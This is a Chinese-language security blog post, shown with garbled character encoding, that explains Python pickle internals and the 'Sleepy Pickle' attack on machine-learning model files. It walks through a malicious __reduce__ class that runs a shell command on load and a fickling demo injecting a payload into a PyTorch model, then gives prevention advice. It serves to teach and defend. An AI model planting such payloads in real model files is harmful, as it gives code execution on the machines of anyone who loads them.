<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> Sleepy Pickle Â· yunshiuan</title><meta name="description" content="Sleepy Pickle - yunshiuan"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/assets/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="/css/prism.css"><link rel="stylesheet" href="/css/prism-line-numbers.css"><link rel="search" type="application/opensearchdescription+xml" href="https://yunshiuan.com/atom.xml" title="yunshiuan"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="yunshiuan" type="application/atom+xml">
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/assets/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/blog/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="https://github.com/YunshiuanOAO" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/assets/CV.pdf" target="_self" class="nav-list-link">CV</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">Sleepy Pickle</h1><div class="post-info">Aug 14, 2025</div><div class="post-content"><h1 id="ğŸ’¤ğŸ¥’Sleeply-Pickle"><a href="#ğŸ’¤ğŸ¥’Sleeply-Pickle" class="headerlink" title="ğŸ’¤ğŸ¥’Sleeply Pickle"></a>ğŸ’¤ğŸ¥’Sleeply Pickle</h1><p>Demo code : <a target="_blank" rel="noopener" href="https://github.com/YunshiuanOAO/SleepyPickle-Demo">https://github.com/YunshiuanOAO/SleepyPickle-Demo</a></p>
<p>Slido : <a target="_blank" rel="noopener" href="https://speakerdeck.com/yunshiuanoao/sleeplypickle">https://speakerdeck.com/yunshiuanoao/sleeplypickle</a></p>
<h2 id="â™»ï¸åºåˆ—åŒ–-Serialization-ååºåˆ—åŒ–-Deserialization"><a href="#â™»ï¸åºåˆ—åŒ–-Serialization-ååºåˆ—åŒ–-Deserialization" class="headerlink" title="â™»ï¸åºåˆ—åŒ–(Serialization)&#x2F;ååºåˆ—åŒ–(Deserialization)"></a>â™»ï¸åºåˆ—åŒ–(Serialization)&#x2F;ååºåˆ—åŒ–(Deserialization)</h2><p>åºåˆ—åŒ–æ˜¯å°‡ä¸€å€‹è³‡æ–™çµæ§‹æˆ–ç‰©ä»¶è½‰æ›æˆä¸€ç¨®å¯ä»¥å„²å­˜æˆ–äº¤æ›çš„æ ¼å¼ï¼ˆå¦‚ä½å…ƒçµ„æµã€JSONã€XML ç­‰ï¼‰ã€‚é€™æ¨£çš„è½‰æ›è®“ç‰©ä»¶èƒ½å¤ å¯«å…¥æª”æ¡ˆã€é€éç¶²è·¯å‚³è¼¸ï¼Œæˆ–å„²å­˜åœ¨è³‡æ–™åº«ä¸­ã€‚</p>
<p>ååºåˆ—åŒ–å‰‡æ˜¯å°‡å„²å­˜çš„æ•¸æ“šæˆ–æ¥æ”¶åˆ°çš„æ•¸æ“šè½‰æ›å›åŸå§‹çš„ç‰©ä»¶æˆ–è³‡æ–™çµæ§‹ã€‚</p>
<p><img src="/./assets/picklePic.png" alt="alt text"></p>
<hr>
<h2 id="ğŸ¥’-What-is-Pickle"><a href="#ğŸ¥’-What-is-Pickle" class="headerlink" title="ğŸ¥’ What is Pickle?"></a>ğŸ¥’ What is Pickle?</h2><p>Pickle æ˜¯ Python çš„å…§å»ºæ¨¡çµ„ï¼Œæä¾›äº†å°‡ Python ç‰©ä»¶åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„åŠŸèƒ½ã€‚</p>
<p>å¸¸è¦‹ç”¨é€”</p>
<dl><dt>:    å°‡ç‰©ä»¶å„²å­˜åˆ°æª”æ¡ˆä¸­ï¼Œæ–¹ä¾¿ä¹‹å¾Œè¼‰å…¥ã€‚<br>:    å°‡ç‰©ä»¶é€éç¶²è·¯æˆ–å…¶ä»–é€šé“é€²è¡Œå‚³è¼¸ã€‚</dt><dd><strong>å¿«é€Ÿå„²å­˜å’Œè¼‰å…¥æ©Ÿå™¨å­¸ç¿’æ¨¡å‹ã€é…ç½®æª”æˆ–è¨ˆç®—çµæœ</strong>ã€‚</dd></dl><p>æ”¯æ´çš„ç‰©ä»¶é¡å‹</p>
<dl><dt>:    Pickle æ”¯æ´å¤šç¨® Python å…§å»ºçš„è³‡æ–™å‹æ…‹ï¼ŒåŒ…æ‹¬ï¼š<br>:    âœ”ï¸ æ•¸å­—ï¼ˆint, floatï¼‰<br>:    âœ”ï¸ å­—ä¸²ï¼ˆstrï¼‰<br>:    âœ”ï¸ åˆ—è¡¨ï¼ˆlistï¼‰ã€å…ƒçµ„ï¼ˆtupleï¼‰ã€å­—å…¸ï¼ˆdictï¼‰ã€é›†åˆï¼ˆsetï¼‰<br>:    âœ”ï¸ è‡ªè¨‚é¡åˆ¥ç‰©ä»¶</dt><dd>âœ”ï¸ å‡½æ•¸</dd></dl><p>Example : </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">import pickle
import pickletools


data &#x3D; &#123;&quot;name&quot;: &quot;Alice&quot;, &quot;age&quot;: 30, &quot;scores&quot;: [88, 92, 95]&#125;

with open(&quot;data.pkl&quot;, &quot;wb&quot;) as file:
    pickle.dump(data, file, protocol&#x3D;0)
    print(&quot;Data has been successfully serialized to data.pkl&quot;)

with open(&quot;data.pkl&quot;, &quot;rb&quot;) as file:
    unpickled_data &#x3D; pickle.load(file)
    print(unpickled_data)

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Output: </p>
<pre class="line-numbers language-none"><code class="language-none">Data has been successfully serialized to data.pkl
&#123;&#39;name&#39;: &#39;Alice&#39;, &#39;age&#39;: 30, &#39;scores&#39;: [88, 92, 95]&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>å¯ä»¥ä½¿ç”¨pickletoolså°‡pickleåŸ·è¡Œçš„å…§å®¹dumpå‡ºä¾†</p>
<pre class="line-numbers language-none"><code class="language-none">    0: (    MARK
    1: d        DICT       (MARK at 0)
    2: p    PUT        0
    5: V    UNICODE    &#39;name&#39;
   11: p    PUT        1
   14: V    UNICODE    &#39;Alice&#39;
   21: p    PUT        2
   24: s    SETITEM
   25: V    UNICODE    &#39;age&#39;
   30: p    PUT        3
   33: I    INT        30
   37: s    SETITEM
   38: V    UNICODE    &#39;scores&#39;
   46: p    PUT        4
   49: (    MARK
   50: l        LIST       (MARK at 49)
   51: p    PUT        5
   54: I    INT        88
   58: a    APPEND
   59: I    INT        92
   63: a    APPEND
   64: I    INT        95
   68: a    APPEND
   69: s    SETITEM
   70: .    STOP
highest protocol among opcodes &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”±ä¸Šé¢çš„è³‡è¨Šå¯ä»¥å¾—çŸ¥ï¼Œå…¶å¯¦Pickleåœ¨ååºåˆ—åŒ–çš„éæˆå°±å¾ˆåƒä¸€å€‹ç°¡æ˜“çš„å †ç–Šè™›æ“¬æ©Ÿåœ¨åŸ·è¡Œï¼Œé€éOpcodeä¸¦ä¸”åœ¨Pickle Virtual MachineåŸ·è¡Œ<br>ä¸»è¦ç”±é€™ä¸‰å€‹</p>
<ul>
<li><p>æŒ‡ä»¤è™•ç†å™¨ (Instruction Processor)</p>
<p>  å¾æŒ‡ä»¤æµ (byte stream) ä¸­è®€å– opcode èˆ‡åƒæ•¸ï¼Œä¸¦ä¾åºé€²è¡Œè§£è­¯èˆ‡è™•ç†ã€‚</p>
<p>  ä¸æ–·é‡è¤‡ã€Œè®€å– -&gt; è™•ç†ã€çš„æµç¨‹ï¼Œç›´åˆ°é‡åˆ°çµæŸç¬¦è™Ÿï¼ˆé€šå¸¸æ˜¯ .ï¼‰å¾Œåœæ­¢ã€‚</p>
<p>  ååºåˆ—åŒ–çµæŸæ™‚ï¼Œæœ€çµ‚ç•™åœ¨ stack é ‚ç«¯çš„å€¼å°‡ä½œç‚ºååºåˆ—åŒ–çµæœè¿”å›ã€‚</p>
</li>
<li><p>Stack (å †ç–Š)</p>
<p>  ç”± Python çš„ list å¯¦ä½œã€‚</p>
<p>  ç”¨æ–¼æš«æ™‚å„²å­˜è³‡æ–™ã€åƒæ•¸ä»¥åŠå„ç¨®ç‰©ä»¶ã€‚</p>
<p>  å„ç¨® opcode æœƒæ“ä½œæ­¤å †ç–Šï¼ˆå¦‚æ¨å…¥ã€å½ˆå‡ºã€çµ„åˆå®¹å™¨ç­‰ï¼‰ã€‚</p>
</li>
<li><p>Memo (å‚™å¿˜éŒ„)</p>
<p>  ç”± Python çš„ dict å¯¦ä½œã€‚</p>
<p>  åœ¨ PVM æ•´å€‹ç”Ÿå‘½é€±æœŸä¸­ï¼Œè² è²¬å„²å­˜å…ˆå‰å‡ºç¾éçš„ç‰©ä»¶ï¼Œä»¥ä¾¿é‡è¤‡å¼•ç”¨æˆ–é¿å…é‡è¤‡å»ºç«‹ã€‚</p>
<p>  é€éç´¢å¼•æˆ–åºè™Ÿ (index) ä¾†å­˜å–å°æ‡‰ç‰©ä»¶ã€‚</p>
</li>
</ul>
<p>ä»¥ä¸‹ç‚ºå¸¸ç”¨çš„opcode </p>
<table>
<thead>
<tr>
<th align="center"><strong>æŒ‡ä»¤</strong></th>
<th align="left"><strong>æè¿°</strong></th>
<th align="left"><strong>å…·é«”å¯«æ³•</strong></th>
<th align="left"><strong>å° stack çš„è®ŠåŒ–</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>c</strong></td>
<td align="left">å–å¾—ä¸€å€‹å…¨å±€ç‰©ä»¶æˆ– import ä¸€å€‹æ¨¡çµ„</td>
<td align="left"><code>c[module]\n[instance]\n</code></td>
<td align="left">å–å¾—çš„ç‰©ä»¶å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>o</strong></td>
<td align="left">å°‹æ‰¾ stack ä¸­çš„ä¸Šä¸€å€‹ MARKï¼Œä»¥ä¹‹é–“çš„ç¬¬ä¸€å€‹è³‡æ–™ï¼ˆå¿…é ˆç‚ºå‡½æ•¸ï¼‰ç‚º callableï¼Œç¬¬äºŒå€‹åˆ°ç¬¬ n å€‹è³‡æ–™ç‚ºåƒæ•¸ï¼ŒåŸ·è¡Œè©²å‡½æ•¸ï¼ˆæˆ–å¯¦ä¾‹åŒ–ä¸€å€‹ç‰©ä»¶ï¼‰</td>
<td align="left"><code>o</code></td>
<td align="left">é€™å€‹éç¨‹ä¸­æ¶‰åŠåˆ°çš„è³‡æ–™éƒ½å‡º stackï¼Œå‡½æ•¸çš„è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„ç‰©ä»¶ï¼‰å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>i</strong></td>
<td align="left">ç›¸ç•¶æ–¼ c å’Œ o çš„çµ„åˆï¼Œå…ˆå–å¾—ä¸€å€‹å…¨å±€å‡½æ•¸ï¼Œç„¶å¾Œå°‹æ‰¾ stack ä¸­çš„ä¸Šä¸€å€‹ MARKï¼Œä¸¦çµ„åˆä¹‹é–“çš„è³‡æ–™ç‚ºå…ƒçµ„ï¼Œå†ä»¥è©²å…ƒçµ„ç‚ºåƒæ•¸åŸ·è¡Œå…¨å±€å‡½æ•¸ï¼ˆæˆ–å¯¦ä¾‹åŒ–ä¸€å€‹ç‰©ä»¶ï¼‰</td>
<td align="left"><code>i[module]\n[callable]\n</code></td>
<td align="left">é€™å€‹éç¨‹ä¸­æ¶‰åŠåˆ°çš„è³‡æ–™éƒ½å‡º stackï¼Œå‡½æ•¸è¿”å›å€¼ï¼ˆæˆ–ç”Ÿæˆçš„ç‰©ä»¶ï¼‰å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>N</strong></td>
<td align="left">å¯¦ä¾‹åŒ–ä¸€å€‹ None</td>
<td align="left"><code>N</code></td>
<td align="left">å–å¾—çš„ None å°è±¡å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>S</strong></td>
<td align="left">å¯¦ä¾‹åŒ–ä¸€å€‹å­—ä¸²å°è±¡</td>
<td align="left"><code>S&#39;xxx&#39;\n</code><br>ä¹Ÿå¯ä½¿ç”¨é›™å¼•è™Ÿæˆ– <code>\&#39;</code> ç­‰ Python å­—ä¸²å½¢å¼</td>
<td align="left">å–å¾—çš„å­—ä¸²å°è±¡å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>V</strong></td>
<td align="left">å¯¦ä¾‹åŒ–ä¸€å€‹ Unicode å­—ä¸²å°è±¡</td>
<td align="left"><code>Vxxx\n</code></td>
<td align="left">å–å¾—çš„å­—ä¸²å°è±¡å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>I</strong></td>
<td align="left">å¯¦ä¾‹åŒ–ä¸€å€‹ int å°è±¡</td>
<td align="left"><code>Ixxx\n</code></td>
<td align="left">å–å¾—çš„æ•´æ•¸å°è±¡å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>F</strong></td>
<td align="left">å¯¦ä¾‹åŒ–ä¸€å€‹ float å°è±¡</td>
<td align="left"><code>Fx.x\n</code></td>
<td align="left">å–å¾—çš„æµ®é»æ•¸å°è±¡å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>R</strong></td>
<td align="left">é¸æ“‡ stack ä¸Šçš„ç¬¬ä¸€å€‹å°è±¡ä½œç‚ºå‡½æ•¸ã€ç¬¬äºŒå€‹å°è±¡ä½œç‚ºåƒæ•¸ï¼ˆç¬¬äºŒå€‹å°è±¡å¿…é ˆç‚ºå…ƒçµ„ï¼‰ï¼Œç„¶å¾Œå‘¼å«è©²å‡½æ•¸</td>
<td align="left"><code>R</code></td>
<td align="left">å‡½æ•¸å’Œåƒæ•¸å‡º stackï¼Œå‡½æ•¸çš„è¿”å›å€¼å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>.</strong></td>
<td align="left">ç¨‹å¼çµæŸï¼Œstack é ‚çš„å–®ä¸€å…ƒç´ ä½œç‚º <code>pickle.loads()</code> çš„è¿”å›å€¼</td>
<td align="left"><code>.</code></td>
<td align="left">ç„¡</td>
</tr>
<tr>
<td align="center"><strong>(</strong></td>
<td align="left">å‘ stack ä¸­å£“å…¥ä¸€å€‹ MARK æ¨™è¨˜</td>
<td align="left"><code>(</code></td>
<td align="left">MARK æ¨™è¨˜å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>t</strong></td>
<td align="left">å°‹æ‰¾ stack ä¸­çš„ä¸Šä¸€å€‹ MARKï¼Œä¸¦çµ„åˆä¹‹é–“çš„è³‡æ–™ç‚ºå…ƒçµ„</td>
<td align="left"><code>t</code></td>
<td align="left">MARK æ¨™è¨˜ä»¥åŠè¢«çµ„åˆçš„è³‡æ–™å‡º stackï¼Œç”Ÿæˆçš„å…ƒçµ„å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>)</strong></td>
<td align="left">å‘ stack ä¸­ç›´æ¥å£“å…¥ä¸€å€‹ç©ºå…ƒçµ„</td>
<td align="left"><code>)</code></td>
<td align="left">ç©ºå…ƒçµ„å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>l</strong></td>
<td align="left">å°‹æ‰¾ stack ä¸­çš„ä¸Šä¸€å€‹ MARKï¼Œä¸¦çµ„åˆä¹‹é–“çš„è³‡æ–™ç‚ºåˆ—è¡¨</td>
<td align="left"><code>l</code></td>
<td align="left">MARK æ¨™è¨˜ä»¥åŠè¢«çµ„åˆçš„è³‡æ–™å‡º stackï¼Œç”Ÿæˆçš„åˆ—è¡¨å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>]</strong></td>
<td align="left">å‘ stack ä¸­ç›´æ¥å£“å…¥ä¸€å€‹ç©ºåˆ—è¡¨</td>
<td align="left"><code>]</code></td>
<td align="left">ç©ºåˆ—è¡¨å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>d</strong></td>
<td align="left">å°‹æ‰¾ stack ä¸­çš„ä¸Šä¸€å€‹ MARKï¼Œä¸¦çµ„åˆä¹‹é–“çš„è³‡æ–™ç‚ºå­—å…¸ï¼ˆè³‡æ–™å¿…é ˆæœ‰å¶æ•¸å€‹ï¼Œå³å‘ˆ key-value å°ï¼‰</td>
<td align="left"><code>d</code></td>
<td align="left">MARK æ¨™è¨˜ä»¥åŠè¢«çµ„åˆçš„è³‡æ–™å‡º stackï¼Œç”Ÿæˆçš„å­—å…¸å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>}</strong></td>
<td align="left">å‘ stack ä¸­ç›´æ¥å£“å…¥ä¸€å€‹ç©ºå­—å…¸</td>
<td align="left"><code>&#125;</code></td>
<td align="left">ç©ºå­—å…¸å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>p</strong></td>
<td align="left">å°‡ stack é ‚å°è±¡å„²å­˜è‡³ memo_n</td>
<td align="left"><code>pn\n</code></td>
<td align="left">ç„¡</td>
</tr>
<tr>
<td align="center"><strong>g</strong></td>
<td align="left">å°‡ memo_n çš„å°è±¡å£“å…¥ stack</td>
<td align="left"><code>gn\n</code></td>
<td align="left">å°‡æŒ‡å®šç´¢å¼•çš„ memo å°è±¡å…¥ stack</td>
</tr>
<tr>
<td align="center"><strong>0</strong></td>
<td align="left">ä¸Ÿæ£„ stack é ‚å°è±¡</td>
<td align="left"><code>0</code></td>
<td align="left">stack é ‚å°è±¡è¢«ä¸Ÿæ£„</td>
</tr>
<tr>
<td align="center"><strong>b</strong></td>
<td align="left">ä½¿ç”¨ stack ä¸­çš„ç¬¬ä¸€å€‹å…ƒç´ ï¼ˆå„²å­˜å¤šå€‹å±¬æ€§å: å±¬æ€§å€¼çš„å­—å…¸ï¼‰å°ç¬¬äºŒå€‹å…ƒç´ ï¼ˆå°è±¡å¯¦ä¾‹ï¼‰é€²è¡Œå±¬æ€§è¨­ç½®</td>
<td align="left"><code>b</code></td>
<td align="left">stack ä¸Šç¬¬ä¸€å€‹å…ƒç´ å‡º stackï¼›ç¬¬äºŒå€‹å…ƒç´ ï¼ˆå°è±¡ï¼‰è¢«æ›´æ–°</td>
</tr>
<tr>
<td align="center"><strong>s</strong></td>
<td align="left">å°‡ stack çš„ç¬¬ä¸€å€‹å’Œç¬¬äºŒå€‹å°è±¡ä½œç‚º key-value å°ï¼Œæ·»åŠ æˆ–æ›´æ–°åˆ° stack çš„ç¬¬ä¸‰å€‹å°è±¡ï¼ˆå¿…é ˆç‚ºåˆ—è¡¨æˆ–å­—å…¸ï¼Œåˆ—è¡¨ä»¥æ•¸å­—ä½œç‚º keyï¼‰</td>
<td align="left"><code>s</code></td>
<td align="left">ç¬¬ä¸€ã€äºŒå€‹å…ƒç´ å‡º stackï¼Œç¬¬ä¸‰å€‹å…ƒç´ ï¼ˆåˆ—è¡¨æˆ–å­—å…¸ï¼‰è¢«æ›´æ–°</td>
</tr>
<tr>
<td align="center"><strong>u</strong></td>
<td align="left">å°‹æ‰¾ stack ä¸­çš„ä¸Šä¸€å€‹ MARKï¼Œçµ„åˆä¹‹é–“çš„è³‡æ–™ï¼ˆå¿…é ˆæœ‰å¶æ•¸å€‹ï¼Œå³ key-value å°ï¼‰ä¸¦å…¨éƒ¨æ·»åŠ æˆ–æ›´æ–°åˆ°è©² MARK ä¹‹å‰çš„ä¸€å€‹å°è±¡ï¼ˆå¿…é ˆç‚ºå­—å…¸ï¼‰</td>
<td align="left"><code>u</code></td>
<td align="left">MARK æ¨™è¨˜ä»¥åŠè¢«çµ„åˆçš„è³‡æ–™å‡º stackï¼Œå­—å…¸è¢«æ›´æ–°</td>
</tr>
<tr>
<td align="center"><strong>a</strong></td>
<td align="left">å°‡ stack çš„ç¬¬ä¸€å€‹å…ƒç´  append åˆ°ç¬¬äºŒå€‹å…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰ä¸­</td>
<td align="left"><code>a</code></td>
<td align="left">stack é ‚å…ƒç´ å‡º stackï¼Œç¬¬äºŒå€‹å…ƒç´ ï¼ˆåˆ—è¡¨ï¼‰è¢«æ›´æ–°</td>
</tr>
<tr>
<td align="center"><strong>e</strong></td>
<td align="left">å°‹æ‰¾ stack ä¸­çš„ä¸Šä¸€å€‹ MARKï¼Œçµ„åˆä¹‹é–“çš„è³‡æ–™ä¸¦ extends åˆ°è©² MARK ä¹‹å‰çš„ä¸€å€‹å…ƒç´ ï¼ˆå¿…é ˆç‚ºåˆ—è¡¨ï¼‰</td>
<td align="left"><code>e</code></td>
<td align="left">MARK æ¨™è¨˜ä»¥åŠè¢«çµ„åˆçš„è³‡æ–™å‡º stackï¼Œåˆ—è¡¨è¢«æ›´æ–°</td>
</tr>
</tbody></table>
<hr>
<h2 id="âš ï¸Whatâ€™s-Wrong-with-Pickle"><a href="#âš ï¸Whatâ€™s-Wrong-with-Pickle" class="headerlink" title="âš ï¸Whatâ€™s Wrong with Pickle ?"></a>âš ï¸Whatâ€™s Wrong with Pickle ?</h2><p>Pickleæ–‡æª”ä¸Šæœ‰å‡ºç¾é€™ä¸€å€‹è­¦å‘Š<br><img src="/./assets/image.png" alt="alt text"></p>
<p>Pickleç•¶ä¸­æœ‰ä¸€å€‹ <code>__reduce__</code> å¯ä»¥ä½¿ç”¨ï¼Œç•¶ååºåˆ—åŒ–æ™‚æœƒè‡ªå‹•å‘¼å«</p>
<p>ä»¥ä¸‹ç¯„ä¾‹ç‚ºè£½ä½œä¸€å€‹æƒ¡æ„çš„pickle</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
import pickle
import subprocess

class EvilPickle:
    def __reduce__(self):
        return (subprocess.Popen, ((&#39;ls&#39;,),))
e &#x3D;  EvilPickle()
with open(&#39;evil.pkl&#39;, &#39;wb&#39;) as f:
    pickle.dump(e, f)
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç”¨pickletool æŠŠæƒ¡æ„pickleæª”dumpå‡ºä¾†çœ‹çœ‹</p>
<pre class="line-numbers language-none"><code class="language-none">    0: c    GLOBAL     &#39;commands Popen&#39;
   16: p    PUT        0
   19: (    MARK
   20: (        MARK
   21: V            UNICODE    &#39;ls&#39;
   25: p            PUT        1
   28: t            TUPLE      (MARK at 20)
   29: p        PUT        2
   32: t        TUPLE      (MARK at 19)
   33: p    PUT        3
   36: R    REDUCE
   37: p    PUT        4
   40: .    STOP
highest protocol among opcodes &#x3D; 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åŸ·è¡Œçµæœï¼š<br><img src="/./assets/reduce_RCE.png" alt="alt text"></p>
<p>å³å¯åŸ·è¡Œ<code>ls</code>æŒ‡ä»¤</p>
<hr>
<h2 id="ğŸ’¤Sleepy-Pickle"><a href="#ğŸ’¤Sleepy-Pickle" class="headerlink" title="ğŸ’¤Sleepy Pickle"></a>ğŸ’¤Sleepy Pickle</h2><p>åˆ©ç”¨pickleä¸å®‰å…¨çš„ç‰¹æ€§ï¼Œå°‡æƒ¡æ„çš„Bytecodeæ¤å…¥ä½¿ç”¨pickleçš„æ¨¡å‹æª”æ¡ˆå…§ã€‚</p>
<p><img src="/./assets/image-2.png" alt="alt text"><br>æœ‰ä¸€å€‹é‡å°æ­¤æ”»æ“Šè€Œç”¢ç”Ÿçš„å·¥å…·ï¼š<a target="_blank" rel="noopener" href="https://github.com/trailofbits/fickling">fickling</a></p>
<p>æ­¤å·¥å…·å¯ä»¥è¼•æ˜“çš„å°‡æƒ³è¦åŸ·è¡Œçš„ç¨‹å¼è½‰æˆbytecodeå€¼å…¥é€²pickleä¸­ï¼Œå¦å¤–ä¹Ÿæœ‰æª¢æ¸¬pickeleå…§çš„æƒ¡æ„è¡Œç‚ºåŠŸèƒ½</p>
<p>demo:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">import torch
import torchvision.models as models
import warnings
from fickling.pytorch import PyTorchModelWrapper
warnings.filterwarnings(&quot;ignore&quot;)

model &#x3D; models.mobilenet_v2()
torch.save(model, &quot;mobilenet.pth&quot;)

result &#x3D; PyTorchModelWrapper(&quot;mobilenet.pth&quot;)

temp_filename &#x3D; &quot;temp_filename.pt&quot;
result.inject_payload(
    &quot;print(&#39;Inject successful!&#39;)&quot;,
    temp_filename,
    injection&#x3D;&quot;insertion&quot;,
    overwrite&#x3D;True,
)

# Load file with injected payload
torch.load(&quot;mobilenet.pth&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¼¸å‡ºï¼š</p>
<p><img src="/./assets/image-1.png" alt="alt text"></p>
<p>åœ¨ Hugging face ä¸Šåœ¨ç›®å‰å¸¸å‡ºç¾çš„æ˜¯<code>pytorch_model.bin</code><br><img src="/./assets/image-3.png" alt="alt text"></p>
<p>pytorch_model.binæ˜¯ä½¿ç”¨PyTorchä¸­çš„torch.save å‡½æ•¸æ‰€ç”Ÿæˆçš„äºŒé€²ä½æª”æ¡ˆï¼Œè£¡é¢æœƒå­˜ weights, biases, æˆ–è€…å…¶ä»–parametersï¼Œå¦‚æœå°‡å®ƒunzipæœƒæœ‰ä¸€å€‹data.pklå¯ä»¥åˆ©ç”¨(æœƒä¾ç…§Pytorchä¸åŒçš„ç‰ˆæœ¬è£¡é¢æœƒåŒ…å«ä¸åŒçš„æª”æ¡ˆ)</p>
<p>!!! info</p>
<pre><code>* PyTorch v0.1.1: Tar file with sys_info, pickle, storages, and tensors
* PyTorch v0.1.10: Stacked pickle files
* TorchScript v1.0: ZIP file with model.json
* TorchScript v1.1: ZIP file with model.json and attributes.pkl
* TorchScript v1.3: ZIP file with data.pkl and constants.pkl
* TorchScript v1.4: ZIP file with data.pkl, constants.pkl, and version set at 2 or higher (2 pickle files and a folder)
* PyTorch v1.3: ZIP file containing data.pkl (1 pickle file)
* PyTorch model archive format[ZIP]: ZIP file that includes Python code files and pickle files
</code></pre>
<p><img src="/./assets/image-4.png" alt="alt text"></p>
<p>!!! warning â€œPyTorché©ç”¨ç‰ˆæœ¬â€<br>    PyTorch &lt;2.6 åœ¨æœ€æ–° 2.6ç‰ˆæœ¬ä¸­ï¼ŒPytorch å°‡ torch.load çš„åƒæ•¸weights_onlyé è¨­ç‚ºTrue</p>
<pre><code>&gt; Also in this release as an important security improvement measure we have changed the default value for weights_only parameter of torch.load. This is a backward compatibility-breaking change, please see this forum post for more details.
</code></pre>
<p>æ¥ä¸‹ä¾†Hacker æœƒå…ˆé€éä¸­é–“äººæ”»æ“Šã€ä¾›æ‡‰éˆæ”»æ“Šã€ç¤¾äº¤å·¥ç¨‹ç­‰æ‰‹æ³•ï¼Œå°‡æƒ¡æ„Pickleæª”æ¡ˆå‚³é€è‡³å—å®³è€…çš„ç³»çµ±ï¼Œä¸€æ—¦ååºåˆ—åŒ–å¾Œæœ‰å¯èƒ½æœƒé€²è¡Œä»¥ä¸‹çš„æƒ¡æ„æ”»æ“Š</p>
<ul>
<li>ä¿®æ”¹æ¨¡å‹åƒæ•¸</li>
</ul>
<p>å¯ä»¥å»å¾®èª¿æ¨¡å‹çš„åƒæ•¸è®“ä»–è¼¸å‡ºå‡ºèª¤å°æ€§æˆ–æœ‰æƒ¡æ„çš„è¼¸å‡º</p>
<p>å¦‚ï¼š<a target="_blank" rel="noopener" href="https://rome.baulab.info/">ROME</a></p>
<p><img src="/./assets/image6.png" alt="alt text"></p>
<ul>
<li>é‡£é­š</li>
</ul>
<p>å¯ä»¥åœ¨æ¯æ¬¡å•ç­”æ™‚æ’å…¥æƒ¡æ„çš„é€£çµ<br><img src="/./assets/image-5.png" alt="alt text"></p>
<ul>
<li>åŸ‹å¾Œé–€</li>
<li>XSS</li>
<li>ç«Šå–ä½¿ç”¨è€…è³‡æ–™</li>
<li>ç«„æ”¹è³‡æ–™</li>
<li>â€¦</li>
</ul>
<hr>
<h2 id="ğŸ¦¾How-To-Prevent"><a href="#ğŸ¦¾How-To-Prevent" class="headerlink" title="ğŸ¦¾How To Prevent"></a>ğŸ¦¾How To Prevent</h2><ul>
<li>ä¸è¦ä½¿ç”¨Pickleï¼Œä½¿ç”¨ SafeTensors.</li>
<li>å¦‚æœä¸€å®šè¦ä½¿ç”¨Pickleï¼Œéœ€è¦ä½¿ç”¨ficklingå°pickleé€²è¡Œæƒææˆ–è€…é™åˆ¶unpickler</li>
</ul>
<hr>
<h2 id="ğŸ“šReference"><a href="#ğŸ“šReference" class="headerlink" title="ğŸ“šReference"></a>ğŸ“šReference</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/">Exploiting ML models with pickle file attacks: Part 1</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-2/">Exploiting ML models with pickle file attacks: Part 2</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/">Never a dill moment: Exploiting machine learning pickle files</a></p>
</li>
